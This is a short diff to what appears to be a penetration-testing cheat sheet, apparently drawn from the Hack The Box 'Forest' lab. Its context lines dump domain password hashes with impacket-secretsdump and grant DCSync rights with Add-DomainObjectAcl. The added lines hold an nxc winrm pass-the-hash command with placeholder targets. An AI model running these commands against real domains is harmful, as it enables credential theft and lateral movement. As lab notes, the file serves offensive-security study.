@@ -2053,7 +2053,10 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
 impacket-secretsdump htb/svc-alfresco@forest
 ```
-
+### Checking Crednetials
+```bash
+nxc winrm <IP1> <IP2> <IP3> -d <DOMAIN> -u '<USERNAME>' -H '<HASH>'
+```
 ---
 ### Ligolo-Ng
 
